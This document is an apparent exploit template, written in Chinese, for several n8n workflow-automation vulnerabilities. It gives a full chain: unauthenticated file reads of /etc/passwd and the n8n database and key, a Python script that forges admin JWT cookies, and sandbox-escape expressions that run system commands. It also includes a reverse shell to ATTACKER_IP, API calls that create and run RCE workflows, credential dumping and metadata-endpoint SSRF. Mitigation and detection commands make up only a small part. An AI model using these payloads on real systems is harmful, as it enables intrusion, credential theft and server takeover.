---
id: N8N-AUTH-BYPASS-RCE
title: n8n 认证绕过与代码执行漏洞
product: n8n
vendor: n8n.io
version_affected: "< 2.14.1"
severity: CRITICAL
tags: [rce, auth_bypass, ssrf, sandbox_bypass, prototype_pollution, 自动化, workflow, 无需认证]
fingerprint: ["n8n", "/rest/", "/webhook/", "n8n.io", "N8N_BASIC_AUTH"]
---

## 漏洞描述

n8n是开源工作流自动化工具。存在未认证文件读取→Cookie伪造→RCE（CVE-2026-21858, CVSS 10.0）、表达式沙箱逃逸RCE（CVE-2025-68613）、认证绕过、通过Code节点RCE、SSRF、原型污染等多个漏洞。

## 影响版本

- CVE-2026-21858（未认证文件读取→RCE）: n8n 1.65.0 ~ 1.120.x
- CVE-2025-68613（沙箱逃逸RCE）: 0.211.0 ≤ n8n < 1.120.4 / 1.121.0 ≤ n8n < 1.121.1
- CVE-2026-27577（沙箱逃逸修复绕过）: n8n < 2.10.1
- CVE-2026-33696（原型污染RCE）: n8n < 2.14.1
- 未授权访问: 未启用认证的全版本

## 前置条件

- 目标开放 5678 端口，运行 n8n
- 未启用认证或存在认证绕过（CVE-2026-21858 无需认证）
- CVE-2026-21858 需知道一个活跃的 Form 端点路径

## 利用步骤

### 未授权访问

n8n默认配置可能未启用认证或使用弱凭据:
```bash
# 尝试直接访问API
curl http://target:5678/rest/workflows
curl http://target:5678/rest/credentials
```

### CVE-2026-21858: 未认证文件读取 → Cookie伪造 → RCE (CVSS 10.0)

**影响版本**: n8n 1.65.0 ~ 1.120.x（已在 1.121.0 修复）
**前提**: 需要知道一个活跃的 Form 端点路径（如 `/form/vulnerable-form`）

**Step 1 — 未认证任意文件读取**:

`formWebhook()` 未验证 Content-Type 是否为 multipart/form-data，攻击者发送 JSON 请求即可控制 `filepath` 读取任意文件:

```http
POST /form/vulnerable-form HTTP/1.1
Host: target:5678
Content-Type: application/json

{"data":{},"files":{"file1":{"filepath":"/etc/passwd","originalFilename":"test.bin","mimetype":"application/octet-stream","size":12345}}}
```

**Step 2 — 读取 n8n 数据库和密钥**:

```http
POST /form/vulnerable-form HTTP/1.1
Content-Type: application/json

{"data":{},"files":{"file1":{"filepath":"/home/node/.n8n/database.sqlite","originalFilename":"t","mimetype":"application/octet-stream","size":1}}}
```

同样读取 `/home/node/.n8n/config` 获取加密密钥。

**Step 3 — 伪造管理员 Cookie**:

```python
import hashlib
from base64 import b64encode
import jwt

def forge(key: str, uid: str, email: str, pw_hash: str):
    secret = hashlib.sha256(key[::2].encode()).hexdigest()
    h = b64encode(hashlib.sha256(f"{email}:{pw_hash}".encode()).digest()).decode()[:10]
    return jwt.encode({"id": uid, "hash": h}, secret, "HS256")

# key/uid/email/pw_hash 从 database.sqlite 和 config 中提取
print(forge("e1QtJCTPa/eVv05SSX62Mg+/Gv9YX8O+",
            "c57acaa0-5774-4e4b-a622-673e78147193",
            "admin@example.com",
            "$2a$10$VhJ.qolnKgmxIB4aGL9Uwe76slmmfzzbAmGvC2w81hwTD0GWCU2oK"))
```

**Step 4 — 使用伪造 Cookie + 表达式注入 RCE** (链接 CVE-2025-68613):

携带伪造的 `n8n-auth` Cookie 访问 `/rest/users` 验证权限，然后通过工作流表达式注入执行命令。

### CVE-2025-68613: 表达式沙箱逃逸 RCE（完整 Payload）

**影响版本**: 0.211.0 ≤ n8n < 1.120.4 / 1.121.0 ≤ n8n < 1.121.1 / n8n < 1.122.0
**前提**: 需认证用户，拥有工作流编辑权限

创建工作流 → Manual Trigger → Edit Fields(Set) 节点，在 value 字段切换到 Expression 模式输入:

```
{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

执行任意命令:
```
{{ (function(){ return this.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() })() }}
```

反弹 Shell:
```
{{ (function(){ this.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'); return "done" })() }}
```

### 通过 JavaScript Code 节点执行系统命令

创建包含恶意代码的 Workflow:
```json
{
  "nodes": [{
    "type": "n8n-nodes-base.code",
    "parameters": {
      "jsCode": "const {execSync} = require('child_process');\nreturn [{json: {output: execSync('id').toString()}}];"
    }
  }]
}
```

API创建并执行:
```http
POST /rest/workflows HTTP/1.1
Content-Type: application/json

{
  "name": "pwn",
  "active": false,
  "nodes": [
    {
      "name": "Code",
      "type": "n8n-nodes-base.code",
      "position": [250, 300],
      "parameters": {
        "jsCode": "const {execSync} = require('child_process'); return [{json:{r:execSync('cat /etc/passwd').toString()}}];"
      }
    }
  ],
  "connections": {}
}
```

```http
POST /rest/workflows/<id>/run HTTP/1.1
```

### CVE-2025-68668: Python Code 节点 Pyodide 沙箱逃逸

n8n < 2.0.0 的 Python Code 节点使用 Pyodide（浏览器端 Python）运行用户代码，但沙箱隔离不足，经认证用户可逃逸执行宿主机命令。

```json
{
  "name": "Python RCE",
  "active": false,
  "nodes": [
    {
      "name": "Code",
      "type": "n8n-nodes-base.code",
      "position": [250, 300],
      "parameters": {
        "language": "python",
        "pythonCode": "import os\nresult = os.popen('id').read()\nreturn [{\"json\": {\"output\": result}}]"
      }
    }
  ],
  "connections": {}
}
```

如果 Pyodide 沙箱逃逸被限制，可尝试通过 `__import__` 或 `eval` 绕过:
```python
__import__('subprocess').check_output(['cat','/etc/passwd']).decode()
```

**影响版本**: n8n < 2.0.0（Pyodide 模式为默认，2.0.0 起切换为 task-runner 隔离）
**前提**: 需认证用户，拥有创建/编辑 Workflow 权限

### 凭据泄露

```bash
# 列出所有存储的凭据（包含数据库密码、API密钥等）
curl http://target:5678/rest/credentials
# 导出凭据详情
curl http://target:5678/rest/credentials/<id>
```

### SSRF (通过 HTTP Request 节点)

```json
{
  "type": "n8n-nodes-base.httpRequest",
  "parameters": {
    "url": "http://169.254.169.254/latest/meta-data/",
    "method": "GET"
  }
}
```

### Webhook 端点枚举

```bash
# Webhook默认路径
curl http://target:5678/webhook/test
curl http://target:5678/webhook-test/
```

### CVE-2026-27577: 表达式沙箱逃逸 RCE（CVE-2025-68613 修复绕过）

n8n < 2.10.1 的表达式求值存在新的沙箱逃逸向量，绕过 CVE-2025-68613 的修复。Payload 同上述 CVE-2025-68613 表达式注入模式。

**影响版本**: n8n < 2.10.1 / 2.9.3 / 1.123.22
**前提**: 需认证用户，拥有工作流编辑权限

### CVE-2026-27493: Form 节点二次表达式注入

n8n Form 节点存在二次表达式注入：当下游 Form 节点渲染用户输入并以 `=` 开头时（如 `=<h2>Thank you, {{ $input.first().json["Name"] }}!</h2>`），攻击者提交的表单值会被当作表达式二次求值。结合沙箱逃逸可实现 RCE。

**影响版本**: n8n < 2.10.1 / 2.9.3 / 1.123.22
**前提**: 工作流需存在特定配置（Form 节点字段以 `=` 前缀引用用户输入）；需链接独立的沙箱逃逸漏洞

### CVE-2026-33696: GSuiteAdmin 节点原型污染 → RCE

经认证用户通过 GSuiteAdmin 节点提交特制参数，利用 XML 解析中的原型污染将攻击者控制的值写入 `Object.prototype`，进而实现远程代码执行。

**影响版本**: n8n < 2.14.1 / 2.13.3 / 1.123.27
**前提**: 需认证用户
**缓解**: 将 `n8n-nodes-base.xml` 加入 `NODES_EXCLUDE` 环境变量

### CVE-2026-33660: Merge 节点 AlaSQL RCE

Merge 节点 "Combine by SQL" 模式使用 AlaSQL 执行 SQL，但沙箱未充分限制，经认证用户可通过特制 SQL 语句读取本地文件或执行命令。

**影响版本**: n8n < 2.14.1 / 2.13.3 / 1.123.27
**前提**: 需认证用户
**缓解**: 将 `n8n-nodes-base.merge` 加入 `NODES_EXCLUDE` 环境变量

## Payload

```bash
# 未授权访问API
curl -s http://target:5678/rest/workflows
curl -s http://target:5678/rest/credentials

# CVE-2026-21858: 未认证任意文件读取
curl -X POST "http://target:5678/form/vulnerable-form" \
  -H "Content-Type: application/json" \
  -d '{"data":{},"files":{"file1":{"filepath":"/etc/passwd","originalFilename":"t","mimetype":"application/octet-stream","size":1}}}'

# 通过Code节点创建RCE工作流并执行
curl -X POST "http://target:5678/rest/workflows" \
  -H "Content-Type: application/json" \
  -d '{"name":"pwn","active":false,"nodes":[{"name":"Code","type":"n8n-nodes-base.code","position":[250,300],"parameters":{"jsCode":"const {execSync}=require(\"child_process\");return [{json:{r:execSync(\"id\").toString()}}];"}}],"connections":{}}'
# 记录返回的workflow id，然后执行:
# curl -X POST "http://target:5678/rest/workflows/<id>/run"
```

## 验证方法

```bash
# 检测未授权访问
curl -s -o /dev/null -w "%{http_code}" http://target:5678/rest/workflows
# 返回200表示未启用认证

# 检测CVE-2026-21858文件读取
curl -s -o /dev/null -w "%{http_code}" -X POST "http://target:5678/form/vulnerable-form" \
  -H "Content-Type: application/json" \
  -d '{"data":{},"files":{"file1":{"filepath":"/etc/hostname","originalFilename":"t","mimetype":"application/octet-stream","size":1}}}'
# 返回200且响应包含文件内容表示存在漏洞

# 检测n8n版本
curl -s http://target:5678/rest/settings | grep -o '"versionCli":"[^"]*"'
```

## 指纹确认

```bash
curl -s http://target:5678/ | grep -i "n8n"
curl -s http://target:5678/rest/settings
curl -s -I http://target:5678/ | grep -i "n8n"
```
